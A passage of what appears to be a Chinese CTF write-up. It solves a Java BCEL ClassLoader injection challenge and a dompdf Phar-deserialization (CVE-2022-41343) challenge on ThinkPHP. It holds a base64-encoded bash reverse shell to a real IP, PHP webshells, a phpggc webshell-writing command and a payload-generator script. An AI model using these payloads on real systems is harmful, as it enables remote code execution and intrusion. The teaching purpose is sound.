_main(String[] argv) is not defined&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    method.invoke(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; argv &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(Exception ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>loader.loadClass(class_name);</code>处显然是有类加载的，而这个loader仔细一看会发现是一个BCEL</p><p><img src="../images/image-20230425195757268.png" alt="image-20230425195757268"></p><p>根据这道题在重新捡一下<strong>动态类加载</strong>   进行复习一下</p><p>这里的话考察的是  <a href="https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel">Java安全之BCEL ClassLoader</a></p><p>既然有这个东西，那么我们就写篇文章来学一下这个<code>BCEL ClassLoader</code></p><p>然后对于上述的JavaWrapper类，最后loadclass后会去调用恶意类的_main方法，那我们只需要复刻一下恶意类就好了</p><p><strong>下面的就是恶意类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230425224414705.png" alt="image-20230425224414705"></p><p><strong>随之把他编译为字节码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(calc.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span>+code);</span><br><span class="line">        Class.forName(<span class="string">&quot;$$BCEL$$&quot;</span>+code,<span class="literal">true</span>,<span class="keyword">new</span> <span class="title class_">ClassLoader</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后打入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.getValue(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper._main(split(&#x27;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmR$5dO$TA$U$3dC$b7$5d$ba$ae$C$c5$ef$_$aab$y$d2$ba$R$88$n$a91i$9ab4$db$WiS$82$3e$98$e92$d9N$d3$dd$r$bb$db$ba$80$fc$u_$d4$f8$e0$P$f0G$Z$ef$b4$84$Sa$92$993s$ee$99s$e7$de$cc$9f$bf$bf$7e$Dx$89$a7$G2$b8m$e0$O$ee$ce$e2$9e$c2$fb$3a$k$e8x$c8$90y$z$7d$Z$bfaH$VV$3a$MZ5$d8$X$Ms$b6$f4Ec$e8uE$d8$e6$dd$B19$3bp$f8$a0$c3C$a9$ce$a7$a4$W$f7d4$8e$85$ae$r$S$ee$j$M$84E2$a7$cc$90$fe$ecq$e93$dc$y$7c$b2$fb$7c$c4$ad$B$f7$5d$ab$V$87$d2w$cb$e3T$3ctG$M$8b$97$84$Z$8cZ$e2$88$83X$G$7e$a4c$89$c4$T3u$87$S$g$ad$60$Y$3abK$aaGdU$c2$X$ca$c3$84$8eY$jy$T$8f$f0$98$81wy$d4$cb$97$9c$fc$b1pzAq$cf$db$3a$e2$d5J$cc$5b$95$d5$f7$b22$fa$f8$b6$b3f$af$ef$f4$9d$eafRo$7f$Y$d6$db$b55$bb_K$9a$ad$8d$c3F$bb$3ej$i9$eb$8d$c3$ca$97m$b9$97$9c$7c$3d$s3$f1j$a3X$da$9f$ec$7b$c5$92$3c1$f1$E$cb$M$f3$ff$97O$d4$b4$a6f$b7$_$9c$98$K$jS2$b0$de5$cf$8acX$98$Kw$86$7e$y$3d$aa$c8pE$7cv$b8QX$b1$_h$a8C$9aH$E$rzV$b8$a4$bb$e7$a8$ed0pD$U$95$a9$ri$fa$Ej$a4$c0T$a3h$cd$d2$c9$od$84$e9$e7$3f$c0$be$d1f$G$G$ad$99$J$89$x$b4$9a$a7$7b$TW$J$b3$b8$869R$a9$cb$9b$84$wf$fc$c4L$$$f5$j$da$ee$d4$c1$m$E$r$caR$aa$a9$8b$81y$y$Q$e6hj$c4$yR$fc$3a$f9M$k$b3JS$a9$$$3c$c4$3cgA$3d$Z$5b$d0$df$g$abn$fd$D$f9$9fP$X$e8$C$A$A&#x27;,&#x27;,&#x27;))&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里用到的split来获取数组，因为_main只接受数组参数</p><p><img src="../images/image-20230425224659954.png" alt="image-20230425224659954"></p><p><img src="../images/image-20230426104354659.png" alt="image-20230426104354659"></p><p>在这里loadclass返回恶意类之后，然后调用了恶意类里的_main方法，然后就到题目的</p><p><code>context.getvalue()</code>方法，这个方法会调用到invoke方法，然后进行命令执行。</p><h2 id="pdf-converter-revenge"><a href="#pdf-converter-revenge" class="headerlink" title="pdf_converter_revenge"></a>pdf_converter_revenge</h2><p>题目</p><p><img src="../images/image-20230426105232681.png" alt="image-20230426105232681"></p><p>查看给的源码发现这里存在一个路劲，然后发现了这个thinkphp版本，这里的非预期解是可以直接拿thinkphp   v5.0.21的poc直接打</p><p><strong>接下来讲一下预期解</strong></p><p><strong>考点：Phar反序列化</strong></p><p><img src="../images/image-20230426105634466.png" alt="image-20230426105634466"></p><p>发现有一个依赖叫做<strong>dompdf</strong></p><p><a href="http://buaq.net/go-129526.html">CVE-2022-41343 - 通过 Phar 反序列化的 RCE</a></p><p>这里的话根据版本号去google搜索漏洞的话，还是可以搜到一些漏洞分析文章的</p><p><a href="https://www.ctfiot.com/79602.html">DomPDF库反序列化RCE漏洞分析</a></p><p>这两篇文章都可以进行参考</p><p><strong>漏洞点</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerFont</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$remoteFile</span>, <span class="variable">$context</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    [...]</span><br><span class="line">        <span class="variable">$entry</span>[<span class="variable">$styleString</span>] = <span class="variable">$localFile</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Download the remote file</span></span><br><span class="line">        [<span class="variable">$protocol</span>] = <span class="title class_">Helpers</span>::<span class="title function_ invoke__">explode_url</span>(<span class="variable">$remoteFile</span>);</span><br><span class="line">        <span class="variable">$allowed_protocols</span> = <span class="variable language_">$this</span>-&gt;options-&gt;<span class="title function_ invoke__">getAllowedProtocols</span>();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$protocol</span>, <span class="variable">$allowed_protocols</span>)) &#123;</span><br><span class="line">            <span class="title class_">Helpers</span>::<span class="title function_ invoke__">record_warnings</span>(E_USER_WARNING, <span class="string">&quot;Permission denied on <span class="subst">$remoteFile</span>. The communication protocol is not supported.&quot;</span>, <span class="keyword">__FILE__</span>, <span class="keyword">__LINE__</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$allowed_protocols</span>[<span class="variable">$protocol</span>][<span class="string">&quot;rules&quot;</span>] <span class="keyword">as</span> <span class="variable">$rule</span>) &#123;</span><br><span class="line">            [<span class="variable">$result</span>, <span class="variable">$message</span>] = <span class="variable">$rule</span>(<span class="variable">$remoteFile</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span> !== <span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="title class_">Helpers</span>::<span class="title function_ invoke__">record_warnings</span>(E_USER_WARNING, <span class="string">&quot;Error loading <span class="subst">$remoteFile</span>: <span class="subst">$message</span>&quot;</span>, <span class="keyword">__FILE__</span>, <span class="keyword">__LINE__</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$remoteFileContent</span>, <span class="variable">$http_response_header</span>) = @<span class="title class_">Helpers</span>::<span class="title function_ invoke__">getFileContent</span>(<span class="variable">$remoteFile</span>, <span class="variable">$context</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$remoteFileContent</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426111849366.png" alt="image-20230426111849366"></p><p>主要错误就在这一段，在<code>if ($result !== true)</code>后并没有return来结束，因此可以进入<code>getFileContent</code>函数，这意味着可以使用任何协议，然后包括主角phar</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileContent</span>(<span class="params"><span class="variable">$uri</span>, <span class="variable">$context</span> = <span class="literal">null</span>, <span class="variable">$offset</span> = <span class="number">0</span>, <span class="variable">$maxlen</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="variable">$headers</span> = <span class="literal">null</span>;</span><br><span class="line">        [<span class="variable">$protocol</span>] = <span class="title class_">Helpers</span>::<span class="title function_ invoke__">explode_url</span>(<span class="variable">$uri</span>);</span><br><span class="line">        <span class="variable">$is_local_path</span> = <span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$protocol</span>), [<span class="string">&quot;&quot;</span>, <span class="string">&quot;file://&quot;</span>, <span class="string">&quot;phar://&quot;</span>], <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$can_use_curl</span> = <span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$protocol</span>), [<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span>], <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">set_error_handler</span>([<span class="built_in">self</span>::<span class="variable language_">class</span>, <span class="string">&#x27;record_warnings&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$is_local_path</span> || <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;allow_url_fopen&#x27;</span>) || !<span class="variable">$can_use_curl</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$is_local_path</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$uri</span> = <span class="title class_">Helpers</span>::<span class="title function_ invoke__">encodeURI</span>(<span class="variable">$uri</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$maxlen</span>)) &#123;</span><br><span class="line">                    <span class="variable">$result</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uri</span>, <span class="literal">false</span>, <span class="variable">$context</span>, <span class="variable">$offset</span>, <span class="variable">$maxlen</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$result</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uri</span>, <span class="literal">false</span>, <span class="variable">$context</span>, <span class="variable">$offset</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$result</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$content</span> = <span class="variable">$result</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$http_response_header</span>)) &#123;</span><br><span class="line">                    <span class="variable">$headers</span> = <span class="variable">$http_response_header</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="variable">$can_use_curl</span> &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;curl_exec&#x27;</span>)) &#123;</span><br><span class="line">         [...]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">restore_error_handler</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$content</span>, <span class="variable">$headers</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426112016718.png" alt="image-20230426112016718"></p><p>这里就是触发phar反序列化的关键了</p><p>可以看到<code>file_get_contents</code>，之后就不赘述了，接下来解释一下复现步骤，由于题目是基于TP5的，那么肯定是可以打TP5的反序列化利用链。<br>首先我们要生成恶意字体文件，用以下脚本去生成：</p><p>脚本是上面的分析文章里写的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> fontforge</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    sys.stdout.buffer.write(do_generate_font())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_generate_font</span>() -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    fd, fn = tempfile.mkstemp(suffix=<span class="string">&quot;.ttf&quot;</span>)</span><br><span class="line">    os.close(fd)</span><br><span class="line">    font = fontforge.font()</span><br><span class="line">    font.copyright = <span class="string">&quot;DUMMY FONT&quot;</span></span><br><span class="line">    font.generate(fn)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(fn, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        res = f.read()</span><br><span class="line">    os.unlink(fn)</span><br><span class="line">    result = res</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>大概率会报错font模块没找到<code>apt-get install python3-fontforge</code>安装一下<br>之后可以生成可以font：</p><p><img src="../images/image-20230426114443537.png" alt="image-20230426114443537"></p><p>就是把python脚本生成的内容给到<code>font.ttf</code>里面</p><p><strong>然后就开始使用phpggc来生成payload</strong></p><p>PHPGGC是一款能够自动生成主流框架的序列化测试payload的工具,可以说是反序列化的武器库,平时遇到有关反序列化的题目时如果能够熟练运用它，将节省大量功夫</p><p><code>./phpggc -l</code>    查看可利用的反序列化链</p><p><img src="../images/image-20230426195919698.png" alt="image-20230426195919698"></p><p>这里根据题目的thinkphp版本来进行选</p><p><code>./phpggc ThinkPHP/FW1 &lt;remote_path&gt; &lt;local_path&gt;</code><br>用法如上，remote_path是要写入靶场的位置，local_path是你shell文件的位置。<br>需要注意的是。tp5的话写入public文件夹下。因为只有public文件夹下我们可以访问<br>这里我准备的shell如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426200140792.png" alt="image-20230426200140792"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d phar.<span class="keyword">readonly</span>=<span class="number">0</span> phpggc ThinkPHP/RCE2 system <span class="string">&quot;echo &#x27;&lt;?php system(<span class="subst">$_GET</span>[0]); ?&gt;&#x27; &gt; /var/www/html/public/mochu7.php&quot;</span> -p phar -pp font.ttf -o font-polyglot.phar</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426201055420.png" alt="image-20230426201055420"></p><p><strong>然后用下面的脚本生成payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">PAYLOAD_TEMPLATE_URL_ENCODED = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;%s&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">PAYLOAD_TEMPLATE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;style&gt;</span></span><br><span class="line"><span class="string">    @font-face &#123;</span></span><br><span class="line"><span class="string">        font-family:&#x27;exploit&#x27;;</span></span><br><span class="line"><span class="string">        src:url(&#x27;%s&#x27;);</span></span><br><span class="line"><span class="string">        font-weight:&#x27;normal&#x27;;</span></span><br><span class="line"><span class="string">        font-style:&#x27;normal&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_args</span>():</span><br><span class="line">    parser = argparse.ArgumentParser( prog=<span class="string">&quot;generate_payload.py&quot;</span>,</span><br><span class="line">                      formatter_class=<span class="keyword">lambda</span> prog: argparse.HelpFormatter(prog,max_help_position=<span class="number">50</span>),</span><br><span class="line">                      epilog= <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                       This script will generate payloads for CVE-2022-41343</span></span><br><span class="line"><span class="string">                      &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;file&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Polyglot File&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--path&quot;</span>, default=<span class="string">&quot;/var/www/&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Base path to vendor directory (Default = /var/www/)&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    args = get_args()</span><br><span class="line">    file = args.file.strip()</span><br><span class="line">    path = args.path.strip()</span><br><span class="line">    <span class="keyword">if</span>(os.path.exists(file)):</span><br><span class="line">        generate_payloads(file, path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: File doesn&#x27;t exist.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payloads</span>(<span class="params">file, path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        fc = f.read()</span><br><span class="line">    b64 = base64.b64encode(fc)</span><br><span class="line">    data_uri_pure = <span class="string">&quot;data:text/plain;base64,%s&quot;</span> % b64.decode()</span><br><span class="line">    data_uri_double_encoded = <span class="string">&quot;data:text/plain;base64,%s&quot;</span> % urllib.parse.quote_plus(urllib.parse.quote_plus(b64.decode()))</span><br><span class="line">    md5 = hashlib.md5(urllib.parse.unquote(data_uri_double_encoded).encode()).hexdigest()</span><br><span class="line">    <span class="comment"># 计算md5这里，因为大佬这里是两次url编码，但是上传之后服务器接收会解一次url，dompdf真正处理的数据应该是经过一次url解码的数据，所以计算md5需要解一次url编码才是正确的文件名</span></span><br><span class="line">    phar_uri = <span class="string">&quot;phar://%s/vendor/dompdf/dompdf/lib/fonts/exploit_normal_%s.ttf##&quot;</span> % (path,md5)</span><br><span class="line">    req1_enc = PAYLOAD_TEMPLATE_URL_ENCODED % data_uri_double_encoded</span><br><span class="line">    req2_enc = PAYLOAD_TEMPLATE_URL_ENCODED % urllib.parse.quote_plus(phar_uri)</span><br><span class="line">    req1_pure = PAYLOAD_TEMPLATE % data_uri_double_encoded</span><br><span class="line">    req2_pure = PAYLOAD_TEMPLATE % phar_uri</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 1 ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req1_enc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 2 ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req2_enc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 1 NOT ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req1_pure)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 2 NOT ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req2_pure)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="number">1.</span>py -p <span class="string">&quot;/var/www/html&quot;</span> font-polyglot.phar</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426201328406.png" alt="image-20230426201328406"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">====== REQUEST 1 ENCODED =======</span><br><span class="line"></span><br><span 